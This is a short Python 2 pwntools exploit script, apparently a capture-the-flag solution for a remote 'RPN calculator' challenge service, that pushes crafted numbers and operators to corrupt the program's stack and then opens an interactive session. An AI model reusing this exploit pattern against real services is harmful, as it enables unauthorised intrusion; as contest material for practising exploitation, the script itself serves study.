#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'

###

if DEBUG:
    r = process('./calc')
else:
    r = remote('rpncalculator.thcon.party', 5555)

def add(nb):
    global r
    r.send(nb)
    r.recvuntil('> ')

r.recvuntil('> ')
GDB = True
if GDB and DEBUG:
    gdb.attach(r, '''b *0x400954''')
for x in xrange(66):
    add('5\n')
add(str(0x43) + '\n')
for x in xrange(2):
    add('5\n')
#for x in xrange(2):
#    add('1\n')
add('0\n')
add('2166')
add('255\n')
add('257\n')
add('64\n')
add('*\n')
add('*\n')
add('+\n')
add('+\n')
add('0\n')

r.interactive()
